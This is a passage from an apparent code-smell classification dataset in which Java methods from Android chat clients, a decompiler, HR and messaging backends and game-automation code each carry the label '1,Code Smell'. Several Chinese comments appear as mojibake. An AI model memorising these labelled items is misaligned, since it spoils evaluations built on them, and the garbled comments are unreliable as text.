          mediaType.getSchema().getItems().additionalProperties(s);
        }
 else {
          mediaType.getSchema().additionalProperties(s);
        }
      }
);
    }
  }
 catch (  Exception e) {
    if (isArray(annotationContent))     mediaType.setSchema(new ArraySchema().items(new StringSchema()));
 else     mediaType.setSchema(new StringSchema());
  }
  return mediaType;
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet int_less(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getUnknown(taintRes);
  }
  boolean hasTrue=false;
  boolean hasFalse=false;
  for (  AbsVal op1 : kSet) {
    if (op1.region.isGlobal()) {
      for (      AbsVal op2 : rhs.kSet) {
        if (op2.region.isGlobal()) {
          if (bits <= 64) {
            if (Long.compareUnsigned(op1.value,op2.value) < 0) {
              hasTrue=true;
            }
 else {
              hasFalse=true;
            }
          }
 else {
            BigInteger bigOp1=op1.toBigInteger(bits,false);
            BigInteger bigOp2=op2.toBigInteger(bits,false);
            if (bigOp1.compareTo(bigOp2) < 0) {
              hasTrue=true;
            }
 else {
              hasFalse=true;
            }
          }
          if (hasTrue && hasFalse) {
            return getUnknown(taintRes);
          }
        }
      }
    }
  }
  if (hasTrue && !hasFalse) {
    return getTrue(taintRes);
  }
 else   if (hasFalse && !hasTrue) {
    return getFalse(taintRes);
  }
  return getUnknown(taintRes);
}",1,Code Smell
"private void enabledDisable(Container container,boolean enabled){
  for (  Component c : container.getComponents()) {
    if (c instanceof JPanel) {
      enabledDisable((JPanel)c,enabled);
      continue;
    }
    c.setEnabled(enabled);
    if (c instanceof JScrollPane) {
      Component view=((JScrollPane)c).getViewport().getView();
      if (view != null)       view.setEnabled(enabled);
    }
 else     if (c instanceof JTabbedPane) {
      JTabbedPane tabPane=(JTabbedPane)c;
      int tabCount=tabPane.getTabCount();
      for (int i=0; i < tabCount; i++) {
        Component tab=tabPane.getComponentAt(i);
        if (tab != null)         tab.setEnabled(enabled);
      }
    }
    if (c instanceof JToolBar)     enabledDisable((JToolBar)c,enabled);
  }
}",1,Code Smell
"private void prepareForMoving(MotionEvent ev){
  maybeStartTracking=false;
  startedTracking=true;
  layoutToIgnore=containerViewBack;
  startedTrackingX=(int)ev.getX();
  containerViewBack.setVisibility(View.VISIBLE);
  beginTrackingSent=false;
  BaseFragment lastFragment=fragmentsStack.get(fragmentsStack.size() - 2);
  View fragmentView=lastFragment.fragmentView;
  if (fragmentView == null) {
    fragmentView=lastFragment.createView(parentActivity);
    if (NekoConfig.disableVibration.Bool()) {
      VibrateUtil.disableHapticFeedback(fragmentView);
    }
  }
  ViewGroup parent=(ViewGroup)fragmentView.getParent();
  if (parent != null) {
    lastFragment.onRemoveFromParent();
    parent.removeView(fragmentView);
  }
  containerViewBack.addView(fragmentView);
  FrameLayout.LayoutParams layoutParams=(FrameLayout.LayoutParams)fragmentView.getLayoutParams();
  layoutParams.width=LayoutHelper.MATCH_PARENT;
  layoutParams.height=LayoutHelper.MATCH_PARENT;
  layoutParams.topMargin=layoutParams.bottomMargin=layoutParams.rightMargin=layoutParams.leftMargin=0;
  fragmentView.setLayoutParams(layoutParams);
  if (lastFragment.actionBar != null && lastFragment.actionBar.shouldAddToContainer()) {
    parent=(ViewGroup)lastFragment.actionBar.getParent();
    if (parent != null) {
      parent.removeView(lastFragment.actionBar);
    }
    if (removeActionBarExtraHeight) {
      lastFragment.actionBar.setOccupyStatusBar(false);
    }
    containerViewBack.addView(lastFragment.actionBar);
    lastFragment.actionBar.setTitleOverlayText(titleOverlayText,titleOverlayTextId,overlayAction);
  }
  if (!lastFragment.hasOwnBackground && fragmentView.getBackground() == null) {
    fragmentView.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
  }
  lastFragment.onResume();
  if (themeAnimatorSet != null) {
    presentingFragmentDescriptions=lastFragment.getThemeDescriptions();
  }
  BaseFragment currentFragment=fragmentsStack.get(fragmentsStack.size() - 1);
  currentFragment.prepareFragmentToSlide(true,true);
  lastFragment.prepareFragmentToSlide(false,true);
}",1,Code Smell
"private void fetchRecentLocations(ArrayList<TLRPC.Message> messages){
  IMapsProvider.ILatLngBoundsBuilder builder=null;
  if (firstFocus) {
    builder=ApplicationLoader.getMapsProvider().onCreateLatLngBoundsBuilder();
  }
  int date=getConnectionsManager().getCurrentTime();
  for (int a=0; a < messages.size(); a++) {
    TLRPC.Message message=messages.get(a);
    if (message.date + message.media.period > date) {
      if (builder != null) {
        IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(message.media.geo.lat,message.media.geo._long);
        builder.include(latLng);
      }
      addUserMarker(message);
      if (proximityButton.getVisibility() != View.GONE && MessageObject.getFromChatId(message) != getUserConfig().getClientUserId()) {
        proximityButton.setVisibility(View.VISIBLE);
        proximityAnimationInProgress=true;
        proximityButton.animate().alpha(1.0f).scaleX(1.0f).scaleY(1.0f).setDuration(180).setListener(new AnimatorListenerAdapter(){
          @Override public void onAnimationEnd(          Animator animation){
            proximityAnimationInProgress=false;
            maybeShowProximityHint();
          }
        }
).start();
      }
    }
  }
  if (builder != null) {
    if (firstFocus) {
      listView.smoothScrollBy(0,AndroidUtilities.dp(66 * 1.5f));
    }
    firstFocus=false;
    adapter.setLiveLocations(markers);
    if (messageObject.isLiveLocation()) {
      try {
        IMapsProvider.ILatLngBounds bounds=builder.build();
        IMapsProvider.LatLng center=bounds.getCenter();
        IMapsProvider.LatLng northEast=move(center,100,100);
        IMapsProvider.LatLng southWest=move(center,-100,-100);
        builder.include(southWest);
        builder.include(northEast);
        bounds=builder.build();
        if (messages.size() > 1) {
          try {
            moveToBounds=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngBounds(bounds,AndroidUtilities.dp(80 + 33));
            map.moveCamera(moveToBounds);
            moveToBounds=null;
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
        }
      }
 catch (      Exception ignore) {
      }
    }
  }
}",1,Code Smell
"public Chunk_1_16(MCAWorld world,Data data){
  super(world,data);
  Level level=data.level;
  this.generated=!STATUS_EMPTY.equals(level.status);
  this.hasLightData=STATUS_FULL.equals(level.status);
  this.inhabitedTime=level.inhabitedTime;
  DimensionType dimensionType=getWorld().getDimensionType();
  this.skyLight=dimensionType.hasSkylight() ? 15 : 0;
  int worldHeight=dimensionType.getHeight();
  int bitsPerHeightmapElement=MCAUtil.ceilLog2(worldHeight + 1);
  this.worldSurfaceHeights=new PackedIntArrayAccess(bitsPerHeightmapElement,level.heightmaps.worldSurface);
  this.oceanFloorHeights=new PackedIntArrayAccess(bitsPerHeightmapElement,level.heightmaps.oceanFloor);
  this.hasWorldSurfaceHeights=this.worldSurfaceHeights.isCorrectSize(VALUES_PER_HEIGHTMAP);
  this.hasOceanFloorHeights=this.oceanFloorHeights.isCorrectSize(VALUES_PER_HEIGHTMAP);
  this.biomes=level.biomes;
  SectionData[] sectionsData=level.sections;
  if (sectionsData != null && sectionsData.length > 0) {
    int min=Integer.MAX_VALUE;
    int max=Integer.MIN_VALUE;
    for (    SectionData sectionData : sectionsData) {
      int y=sectionData.getY();
      if (min > y)       min=y;
      if (max < y)       max=y;
    }
    this.sections=new Section[1 + max - min];
    for (    SectionData sectionData : sectionsData) {
      Section section=new Section(sectionData);
      int y=section.getSectionY();
      if (min > y)       min=y;
      if (max < y)       max=y;
      this.sections[section.sectionY - min]=section;
    }
    this.sectionMin=min;
    this.sectionMax=max;
  }
 else {
    this.sections=new Section[0];
    this.sectionMin=0;
    this.sectionMax=0;
  }
  this.blockEntities=new HashMap<>(level.blockEntities.length);
  for (int i=0; i < level.blockEntities.length; i++) {
    BlockEntity be=level.blockEntities[i];
    if (be == null)     continue;
    long hash=(long)be.getY() << 8 | (be.getX() & 0xF) << 4 | be.getZ() & 0xF;
    blockEntities.put(hash,be);
  }
}",1,Code Smell
"/** 
 * book bound report partition information
 * @param consumer consumer info
 */
private void bookPartitionInfo(ConsumerInfo consumer){
  if (consumeType != ConsumeType.CONSUME_BAND) {
    return;
  }
  Map<String,Long> consumerPartMap=consumer.getRequiredPartition();
  if (consumerPartMap == null || consumerPartMap.isEmpty()) {
    return;
  }
  for (  Map.Entry<String,Long> entry : consumerPartMap.entrySet()) {
    String oldClientId=this.partitionInfoMap.get(entry.getKey());
    if (oldClientId == null) {
      this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
      this.partOffsetMap.put(entry.getKey(),entry.getValue());
    }
 else {
      ConsumerInfo oldConsumerInfo=this.consumerInfoMap.get(oldClientId);
      if (oldConsumerInfo == null) {
        this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
        this.partOffsetMap.put(entry.getKey(),entry.getValue());
      }
 else {
        Map<String,Long> oldConsumerPartMap=oldConsumerInfo.getRequiredPartition();
        if (oldConsumerPartMap == null || oldConsumerPartMap.isEmpty()) {
          this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
          this.partOffsetMap.put(entry.getKey(),entry.getValue());
        }
 else {
          Long oldConsumerOff=oldConsumerPartMap.get(entry.getKey());
          if (oldConsumerOff == null) {
            this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
            this.partOffsetMap.put(entry.getKey(),entry.getValue());
          }
 else {
            if (this.isSelectedBig) {
              if (entry.getValue() >= oldConsumerOff) {
                this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
                this.partOffsetMap.put(entry.getKey(),entry.getValue());
              }
            }
 else {
              if (entry.getValue() < oldConsumerOff) {
                this.partitionInfoMap.put(entry.getKey(),consumer.getConsumerId());
                this.partOffsetMap.put(entry.getKey(),entry.getValue());
              }
            }
          }
        }
      }
    }
  }
}
",1,Code Smell
"/** 
 * 鑾峰彇IP鍦板潃
 * @param request 璇锋眰
 * @return request鍙戣捣瀹㈡埛绔殑IP鍦板潃
 */
private String getIP(HttpServletRequest request){
  if (request == null) {
    return ""0.0.0.0"";
  }
  String Xip=request.getHeader(""X-Real-IP"");
  String XFor=request.getHeader(""X-Forwarded-For"");
  String UNKNOWN_IP=""unknown"";
  if (StringUtils.isNotEmpty(XFor) && !UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    int index=XFor.indexOf("","");
    if (index != -1) {
      return XFor.substring(0,index);
    }
 else {
      return XFor;
    }
  }
  XFor=Xip;
  if (StringUtils.isNotEmpty(XFor) && !UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    return XFor;
  }
  if (StringUtils.isBlank(XFor) || UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    XFor=request.getHeader(""Proxy-Client-IP"");
  }
  if (StringUtils.isBlank(XFor) || UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    XFor=request.getHeader(""WL-Proxy-Client-IP"");
  }
  if (StringUtils.isBlank(XFor) || UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    XFor=request.getHeader(""HTTP_CLIENT_IP"");
  }
  if (StringUtils.isBlank(XFor) || UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    XFor=request.getHeader(""HTTP_X_FORWARDED_FOR"");
  }
  if (StringUtils.isBlank(XFor) || UNKNOWN_IP.equalsIgnoreCase(XFor)) {
    XFor=request.getRemoteAddr();
  }
  return XFor;
}",1,Code Smell
"/** 
 * 閬嶅巻鑺傜偣璺宠繃骞垮憡
 * @param root 鏍硅妭鐐�
 * @param set 浼犲叆set鏃舵寜鎺т欢鍒ゆ柇锛屽惁鍒欐寜鍏抽敭璇嶅垽鏂�
 */
private void iterateNodesToSkipAd(AccessibilityNodeInfo root,Set<PackageWidgetDescription> set){
  ArrayList<AccessibilityNodeInfo> topNodes=new ArrayList<>();
  topNodes.add(root);
  ArrayList<AccessibilityNodeInfo> childNodes=new ArrayList<>();
  int total=topNodes.size();
  int index=0;
  AccessibilityNodeInfo node;
  boolean handled;
  while (index < total && skipAdRunning) {
    node=topNodes.get(index++);
    if (node != null) {
      if (set != null) {
        handled=skipAdByTargetedWidget(node,set);
      }
 else {
        handled=skipAdByKeywords(node);
      }
      if (handled) {
        node.recycle();
        break;
      }
      for (int n=0; n < node.getChildCount(); n++) {
        childNodes.add(node.getChild(n));
      }
      node.recycle();
    }
    if (index == total) {
      topNodes.clear();
      topNodes.addAll(childNodes);
      childNodes.clear();
      index=0;
      total=topNodes.size();
    }
  }
  while (index < total) {
    node=topNodes.get(index++);
    if (node != null)     node.recycle();
  }
  index=0;
  total=childNodes.size();
  while (index < total) {
    node=childNodes.get(index++);
    if (node != null)     node.recycle();
  }
}",1,Code Smell
"@Override protected String transCompare(LabelGroupEnum labelGroupEnum,Dict properties,String newFieldKey,String oldValue,String newValue){
  String content=super.transCompare(labelGroupEnum,properties,newFieldKey,oldValue,newValue);
  String postId=""postId"";
  String sex=""sex"";
  String education=""education"";
  String channelId=""channelId"";
  if (postId.equals(newFieldKey)) {
    HrmRecruitPost oldPost=recruitPostService.getById(oldValue);
    HrmRecruitPost newPost=recruitPostService.getById(newValue);
    if (oldPost != null) {
      oldValue=oldPost.getPostName();
    }
    if (newPost != null) {
      newValue=newPost.getPostName();
    }
    content=""  "" + properties.getStr(newFieldKey) + "" ""+ oldValue+ LanguageFieldEnum.ACTIONRECORD_UPDATE.getFieldFormat()+ newValue;
  }
 else   if (sex.equals(newFieldKey)) {
    if (!NULL.equals(oldValue) && StrUtil.isNumeric(oldValue)) {
      oldValue=SexEnum.parseName(Integer.parseInt(oldValue));
    }
    if (!NULL.equals(newValue) && StrUtil.isNumeric(newValue)) {
      newValue=SexEnum.parseName(Integer.parseInt(newValue));
    }
    content=""  "" + properties.getStr(newFieldKey) + "" ""+ oldValue+ LanguageFieldEnum.ACTIONRECORD_UPDATE.getFieldFormat()+ newValue;
  }
 else   if (education.equals(newFieldKey)) {
    if (!NULL.equals(oldValue) && StrUtil.isNumeric(oldValue)) {
      oldValue=CandidateEducationEnum.parseName(Integer.parseInt(oldValue));
    }
    if (!NULL.equals(newValue) && StrUtil.isNumeric(newValue)) {
      newValue=CandidateEducationEnum.parseName(Integer.parseInt(newValue));
    }
    content=""  "" + properties.getStr(newFieldKey) + "" ""+ oldValue+ LanguageFieldEnum.ACTIONRECORD_UPDATE.getFieldFormat()+ newValue;
  }
 else   if (channelId.equals(newFieldKey)) {
    HrmRecruitChannel oldChannel=recruitChannelService.getById(oldValue);
    HrmRecruitChannel newChannel=recruitChannelService.getById(newValue);
    if (oldChannel != null) {
      oldValue=oldChannel.getValue();
    }
    if (newChannel != null) {
      newValue=newChannel.getValue();
    }
    content=""  "" + properties.getStr(newFieldKey) + "" ""+ oldValue+ LanguageFieldEnum.ACTIONRECORD_UPDATE.getFieldFormat()+ newValue;
  }
  return content;
}
",1,Code Smell
"@Override protected boolean preHandleMethod(HttpServletRequest request,HttpServletResponse response,HandlerMethod handlerMethod) throws Exception {
  String token=TokenUtil.getToken();
  LoginVo loginVo=null;
  if (StringUtils.isNotBlank(token)) {
    loginVo=LoginUtil.getLoginVo(token);
    if (loginVo != null) {
      LoginCache.set(loginVo);
    }
  }
  boolean existsIgnoreLoginAnnotation=existsIgnoreLoginAnnotation(handlerMethod);
  if (existsIgnoreLoginAnnotation) {
    return true;
  }
  if (StringUtils.isBlank(token)) {
    throw new LoginTokenException(""请登录后再操作"");
  }
  if (loginVo == null) {
    throw new LoginTokenException(""登录已过期或登录信息不存在，请重新登录"");
  }
  String roleCode=loginVo.getRoleCode();
  boolean loginPermission=loginAdminProperties.isLoginPermission();
  boolean admin=loginVo.isAdmin();
  if (!admin && loginPermission) {
    Permission permission=handlerMethod.getMethodAnnotation(Permission.class);
    if (permission != null) {
      List<String> permissions=loginVo.getPermissions();
      if (CollectionUtils.isEmpty(permissions)) {
        throw new LoginException(""当前用户未设置权限"");
      }
      String value=permission.value();
      String role=permission.role();
      if (!permissions.contains(value)) {
        log.error(""没有访问权限的登录用户："" + loginVo);
        throw new LoginException(""没有访问权限"");
      }
      if (StringUtils.isNotBlank(role)) {
        if (roleCode.equals(role)) {
          log.error(""没有访问权限的登录用户："" + loginVo);
          throw new LoginException(""该角色没有访问权限"");
        }
      }
    }
  }
  return true;
}
",1,Code Smell
"private static StructField findAssertionField(ClassesProcessor.ClassNode node){
  ClassWrapper wrapper=node.getWrapper();
  boolean noSynthFlag=DecompilerContext.getOption(IFernflowerPreferences.SYNTHETIC_NOT_SET);
  for (  StructField fd : wrapper.getClassStruct().getFields()) {
    String keyField=InterpreterUtil.makeUniqueKey(fd.getName(),fd.getDescriptor());
    if (wrapper.getStaticFieldInitializers().containsKey(keyField)) {
      if (fd.hasModifier(CodeConstants.ACC_STATIC) && fd.hasModifier(CodeConstants.ACC_FINAL) && (noSynthFlag || fd.isSynthetic())) {
        FieldDescriptor fdescr=FieldDescriptor.parseDescriptor(fd.getDescriptor());
        if (VarType.VARTYPE_BOOLEAN.equals(fdescr.type)) {
          Exprent initializer=wrapper.getStaticFieldInitializers().getWithKey(keyField);
          if (initializer.type == Exprent.EXPRENT_FUNCTION) {
            FunctionExprent fexpr=(FunctionExprent)initializer;
            if (fexpr.getFuncType() == FunctionExprent.FUNCTION_BOOL_NOT && fexpr.getLstOperands().get(0).type == Exprent.EXPRENT_INVOCATION) {
              InvocationExprent invexpr=(InvocationExprent)fexpr.getLstOperands().get(0);
              if (invexpr.getInstance() != null && invexpr.getInstance().type == Exprent.EXPRENT_CONST && ""desiredAssertionStatus"".equals(invexpr.getName()) && ""java/lang/Class"".equals(invexpr.getClassname()) && invexpr.getLstParameters().isEmpty()) {
                ConstExprent cexpr=(ConstExprent)invexpr.getInstance();
                if (VarType.VARTYPE_CLASS.equals(cexpr.getConstType())) {
                  ClassesProcessor.ClassNode nd=node;
                  while (nd != null) {
                    if (nd.getWrapper().getClassStruct().qualifiedName.equals(cexpr.getValue())) {
                      break;
                    }
                    nd=nd.parent;
                  }
                  if (nd != null) {
                    return fd;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return null;
}",1,Code Smell
"@Override public J visitBinary(Binary binary,PrintOutputCapture<P> p){
  String keyword="""";
switch (binary.getOperator()) {
case Addition:
    keyword=""+"";
  break;
case Subtraction:
keyword=""-"";
break;
case Multiplication:
keyword=""*"";
break;
case Division:
keyword=""/"";
break;
case Modulo:
keyword=""%"";
break;
case LessThan:
keyword=""<"";
break;
case GreaterThan:
keyword="">"";
break;
case LessThanOrEqual:
keyword=""<="";
break;
case GreaterThanOrEqual:
keyword="">="";
break;
case Equal:
keyword=""=="";
break;
case NotEqual:
keyword=""!="";
break;
case BitAnd:
keyword=""&"";
break;
case BitOr:
keyword=""|"";
break;
case BitXor:
keyword=""^"";
break;
case LeftShift:
keyword=""<<"";
break;
case RightShift:
keyword="">>"";
break;
case UnsignedRightShift:
keyword="">>>"";
break;
case Or:
keyword=""||"";
break;
case And:
keyword=""&&"";
break;
}
beforeSyntax(binary,Space.Location.BINARY_PREFIX,p);
visit(binary.getLeft(),p);
visitSpace(binary.getPadding().getOperator().getBefore(),Space.Location.BINARY_OPERATOR,p);
p.append(keyword);
visit(binary.getRight(),p);
afterSyntax(binary,p);
return binary;
}
",1,Code Smell
"private boolean checkTextSelection(MotionEvent event){
  TextSelectionHelper.ChatListTextSelectionHelper textSelectionHelper=delegate.getTextSelectionHelper();
  if (textSelectionHelper == null || MessagesController.getInstance(currentAccount).isChatNoForwardsWithOverride(currentMessageObject.getChatId()) || (currentMessageObject.messageOwner != null && currentMessageObject.messageOwner.noforwards && !NekoXConfig.disableFlagSecure)) {
    return false;
  }
  boolean hasTextBlocks=currentMessageObject.textLayoutBlocks != null && !currentMessageObject.textLayoutBlocks.isEmpty();
  if (!hasTextBlocks && !hasCaptionLayout()) {
    return false;
  }
  if ((!drawSelectionBackground && currentMessagesGroup == null) || (currentMessagesGroup != null && !delegate.hasSelectedMessages())) {
    return false;
  }
  if (currentMessageObject.hasValidGroupId() && currentMessagesGroup != null && !currentMessagesGroup.isDocuments) {
    ViewGroup parent=(ViewGroup)getParent();
    if (parent == null) {
      return false;
    }
    for (int i=0; i < parent.getChildCount(); i++) {
      View v=parent.getChildAt(i);
      if (v instanceof ChatMessageCell) {
        ChatMessageCell cell=(ChatMessageCell)v;
        MessageObject.GroupedMessages group=cell.getCurrentMessagesGroup();
        MessageObject.GroupedMessagePosition position=cell.getCurrentPosition();
        if (group != null && group.groupId == currentMessagesGroup.groupId && (position.flags & MessageObject.POSITION_FLAG_BOTTOM) != 0 && (position.flags & MessageObject.POSITION_FLAG_LEFT) != 0) {
          textSelectionHelper.setMaybeTextCord((int)cell.captionX,(int)cell.captionY);
          textSelectionHelper.setMessageObject(cell);
          if (cell == this) {
            return textSelectionHelper.onTouchEvent(event);
          }
 else {
            event.offsetLocation(this.getLeft() - cell.getLeft(),this.getTop() - cell.getTop());
            boolean result=textSelectionHelper.onTouchEvent(event);
            event.offsetLocation(-(this.getLeft() - cell.getLeft()),-(this.getTop() - cell.getTop()));
            return result;
          }
        }
      }
    }
    return false;
  }
 else {
    if (hasCaptionLayout()) {
      textSelectionHelper.setIsDescription(false);
      textSelectionHelper.setMaybeTextCord((int)captionX,(int)captionY);
    }
 else     if ((currentMessageObject != null && !currentMessageObject.preview) && descriptionLayout != null && (linkPreviewAbove ? event.getY() < textY : event.getY() > descriptionY)) {
      textSelectionHelper.setIsDescription(true);
      int linkX;
      if (hasGamePreview) {
        linkX=unmovedTextX - AndroidUtilities.dp(10);
      }
 else       if (hasInvoicePreview) {
        linkX=unmovedTextX + AndroidUtilities.dp(1);
      }
 else {
        linkX=unmovedTextX + AndroidUtilities.dp(1);
      }
      textSelectionHelper.setMaybeTextCord(linkX + AndroidUtilities.dp(10) + descriptionX,descriptionY);
    }
 else {
      textSelectionHelper.setIsDescription(false);
      textSelectionHelper.setMaybeTextCord(textX,textY);
    }
    textSelectionHelper.setMessageObject(this);
  }
  return textSelectionHelper.onTouchEvent(event);
}",1,Code Smell
"/** 
 * Create a new instance of a PullParserFactory that can be used to create XML pull parsers (see class description for more details).
 * @return a new instance of a PullParserFactory, as returned by newInstance (null, null); 
 */
public static XmlPullParserFactory newInstance() throws XmlPullParserException {
  return newInstance(null,null);
}
public static XmlPullParserFactory newInstance(String classNames,Class context) throws XmlPullParserException {
  if (context == null) {
    context=referenceContextClass;
  }
  String classNamesLocation=null;
  if (classNames == null || classNames.length() == 0 || ""DEFAULT"".equals(classNames)) {
    try {
      InputStream is=context.getResourceAsStream(RESOURCE_NAME);
      if (is == null)       throw new XmlPullParserException(""resource not found: "" + RESOURCE_NAME + "" make sure that parser implementing XmlPull API is available"");
      final StringBuffer sb=new StringBuffer();
      while (true) {
        final int ch=is.read();
        if (ch < 0)         break;
 else         if (ch > ' ')         sb.append((char)ch);
      }
      is.close();
      classNames=sb.toString();
    }
 catch (    Exception e) {
      throw new XmlPullParserException(null,null,e);
    }
    classNamesLocation=""resource "" + RESOURCE_NAME + "" that contained '""+ classNames+ ""'"";
  }
 else {
    classNamesLocation=""parameter classNames to newInstance() that contained '"" + classNames + ""'"";
  }
  XmlPullParserFactory factory=null;
  final Vector parserClasses=new Vector();
  final Vector serializerClasses=new Vector();
  int pos=0;
  while (pos < classNames.length()) {
    int cut=classNames.indexOf(',',pos);
    if (cut == -1)     cut=classNames.length();
    final String name=classNames.substring(pos,cut);
    Class candidate=null;
    Object instance=null;
    try {
      candidate=Class.forName(name);
      instance=candidate.newInstance();
    }
 catch (    Exception e) {
    }
    if (candidate != null) {
      boolean recognized=false;
      if (instance instanceof XmlPullParser) {
        parserClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlSerializer) {
        serializerClasses.addElement(candidate);
        recognized=true;
      }
      if (instance instanceof XmlPullParserFactory) {
        if (factory == null) {
          factory=(XmlPullParserFactory)instance;
        }
        recognized=true;
      }
      if (!recognized) {
        throw new XmlPullParserException(""incompatible class: "" + name);
      }
    }
    pos=cut + 1;
  }
  if (factory == null) {
    factory=new XmlPullParserFactory();
  }
  factory.parserClasses=parserClasses;
  factory.serializerClasses=serializerClasses;
  factory.classNamesLocation=classNamesLocation;
  return factory;
}",1,Code Smell
"public void detectHDR(Utilities.Callback<HDRInfo> whenDetected){
  if (whenDetected == null) {
    return;
  }
  if (hdrInfo != null) {
    whenDetected.run(hdrInfo);
    return;
  }
  if (!isVideo || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
    whenDetected.run(hdrInfo=new HDRInfo());
    return;
  }
  Utilities.globalQueue.postRunnable(() -> {
    try {
      HDRInfo hdrInfo;
      if (this.hdrInfo == null) {
        hdrInfo=this.hdrInfo=new HDRInfo();
        hdrInfo.maxlum=1000f;
        hdrInfo.minlum=0.001f;
      }
 else {
        hdrInfo=this.hdrInfo;
      }
      MediaExtractor extractor=new MediaExtractor();
      extractor.setDataSource(file.getAbsolutePath());
      int videoIndex=MediaController.findTrack(extractor,false);
      extractor.selectTrack(videoIndex);
      MediaFormat videoFormat=extractor.getTrackFormat(videoIndex);
      if (videoFormat.containsKey(MediaFormat.KEY_COLOR_TRANSFER)) {
        hdrInfo.colorTransfer=videoFormat.getInteger(MediaFormat.KEY_COLOR_TRANSFER);
      }
      if (videoFormat.containsKey(MediaFormat.KEY_COLOR_STANDARD)) {
        hdrInfo.colorStandard=videoFormat.getInteger(MediaFormat.KEY_COLOR_STANDARD);
      }
      if (videoFormat.containsKey(MediaFormat.KEY_COLOR_RANGE)) {
        hdrInfo.colorRange=videoFormat.getInteger(MediaFormat.KEY_COLOR_RANGE);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
 finally {
      this.hdrInfo=hdrInfo;
      AndroidUtilities.runOnUIThread(() -> whenDetected.run(hdrInfo));
    }
  }
);
}",1,Code Smell
"private static void parseSyncAnimalStatusResponse(String resp){
  try {
    JSONObject jo=new JSONObject(resp);
    if (!jo.has(""subFarmVO"")) {
      return;
    }
    JSONObject subFarmVO=jo.getJSONObject(""subFarmVO"");
    if (subFarmVO.has(""foodStock"")) {
      foodStock=subFarmVO.getInt(""foodStock"");
    }
    if (subFarmVO.has(""manureVO"")) {
      JSONArray manurePotList=subFarmVO.getJSONObject(""manureVO"").getJSONArray(""manurePotList"");
      for (int i=0; i < manurePotList.length(); i++) {
        JSONObject manurePot=manurePotList.getJSONObject(i);
        if (manurePot.getInt(""manurePotNum"") >= 100) {
          JSONObject joManurePot=new JSONObject(AntFarmRpcCall.collectManurePot(manurePot.getString(""manurePotNO"")));
          if (joManurePot.getBoolean(""success"")) {
            int collectManurePotNum=joManurePot.getInt(""collectManurePotNum"");
            Log.farm(""鎵撴壂楦″睅馃Ч["" + collectManurePotNum + ""g]"");
          }
        }
      }
    }
    ownerFarmId=subFarmVO.getString(""farmId"");
    JSONObject farmProduce=subFarmVO.getJSONObject(""farmProduce"");
    benevolenceScore=farmProduce.getDouble(""benevolenceScore"");
    if (subFarmVO.has(""rewardList"")) {
      JSONArray jaRewardList=subFarmVO.getJSONArray(""rewardList"");
      if (jaRewardList.length() > 0) {
        rewardList=new RewardFriend[jaRewardList.length()];
        for (int i=0; i < rewardList.length; i++) {
          JSONObject joRewardList=jaRewardList.getJSONObject(i);
          if (rewardList[i] == null)           rewardList[i]=new RewardFriend();
          rewardList[i].consistencyKey=joRewardList.getString(""consistencyKey"");
          rewardList[i].friendId=joRewardList.getString(""friendId"");
          rewardList[i].time=joRewardList.getString(""time"");
        }
      }
    }
    JSONArray jaAnimals=subFarmVO.getJSONArray(""animals"");
    animals=new Animal[jaAnimals.length()];
    for (int i=0; i < animals.length; i++) {
      if (animals[i] == null)       animals[i]=new Animal();
      JSONObject animal=jaAnimals.getJSONObject(i);
      animals[i].animalId=animal.getString(""animalId"");
      animals[i].currentFarmId=animal.getString(""currentFarmId"");
      animals[i].masterFarmId=animal.getString(""masterFarmId"");
      animals[i].animalBuff=animal.getString(""animalBuff"");
      animals[i].subAnimalType=animal.getString(""subAnimalType"");
      JSONObject animalStatusVO=animal.getJSONObject(""animalStatusVO"");
      animals[i].animalFeedStatus=animalStatusVO.getString(""animalFeedStatus"");
      animals[i].animalInteractStatus=animalStatusVO.getString(""animalInteractStatus"");
      if (animals[i].masterFarmId.equals(ownerFarmId))       ownerAnimal=animals[i];
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""parseSyncAnimalStatusResponse err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public void drawTime(Canvas canvas,float alpha,boolean fromParent){
  if (!drawFromPinchToZoom && delegate != null && delegate.getPinchToZoomHelper() != null && delegate.getPinchToZoomHelper().isInOverlayModeFor(this) && shouldDrawTimeOnMedia()) {
    return;
  }
  for (int i=0; i < 2; i++) {
    float currentAlpha=alpha;
    if (i == 0 && isDrawSelectionBackground() && currentSelectedBackgroundAlpha == 1f && !shouldDrawTimeOnMedia()) {
      continue;
    }
 else     if (i == 1 && ((!isDrawSelectionBackground() && currentSelectedBackgroundAlpha == 0) || shouldDrawTimeOnMedia())) {
      break;
    }
    boolean drawSelectionBackground=i == 1;
    if (i == 1) {
      currentAlpha*=currentSelectedBackgroundAlpha;
    }
 else     if (!shouldDrawTimeOnMedia()) {
      currentAlpha*=(1f - currentSelectedBackgroundAlpha);
    }
    if (transitionParams.animateShouldDrawTimeOnMedia && transitionParams.animateChangeProgress != 1f) {
      if (shouldDrawTimeOnMedia()) {
        overideShouldDrawTimeOnMedia=1;
        drawTimeInternal(canvas,currentAlpha * transitionParams.animateChangeProgress,fromParent,this.timeX,timeLayout,timeWidth,drawSelectionBackground);
        overideShouldDrawTimeOnMedia=2;
        drawTimeInternal(canvas,currentAlpha * (1f - transitionParams.animateChangeProgress),fromParent,transitionParams.animateFromTimeX,transitionParams.animateTimeLayout,transitionParams.animateTimeWidth,drawSelectionBackground);
      }
 else {
